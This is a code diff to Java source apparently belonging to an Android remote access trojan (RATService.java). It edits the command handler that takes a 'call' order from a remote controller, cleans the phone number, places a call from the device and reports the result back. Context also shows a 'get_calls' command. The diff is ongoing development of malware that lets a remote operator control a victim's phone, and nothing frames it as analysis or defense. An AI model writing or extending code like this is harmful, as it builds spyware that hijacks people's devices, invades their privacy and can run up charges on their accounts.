@@ -1630,14 +1630,22 @@ case "get_calls":
 //
 //  Flutter sends:  "call|<number>"
 //  So cmd == "call", args == "<number>"
+// In RATService.java - routeCommand method
 case "call":
 case "make_call":
+    Log.d(TAG, "📞 Processing call command with args: '" + args + "'");
     if (callsModule != null && !args.isEmpty()) {
-        Log.d(TAG, "📞 Making call to: " + args);
-        String result = callsModule.makeCall(args);
+        // Clean the number - remove any whitespace or special characters
+        String number = args.trim();
+        // Remove any "tel:" prefix if present
+        if (number.startsWith("tel:")) {
+            number = number.substring(4);
+        }
+        Log.d(TAG, "📞 Making call to cleaned number: " + number);
+        String result = callsModule.makeCall(number);
         sendCommand("CALL_RESULT|" + result);
     } else if (args.isEmpty()) {
-        Log.e(TAG, "❌ make_call: no number in args");
+        Log.e(TAG, "❌ make_call: no number provided");
         sendCommand("CALL_RESULT|ERROR: No phone number provided");
     } else {
         sendCommand("CALL_RESULT|ERROR: Calls module not available");
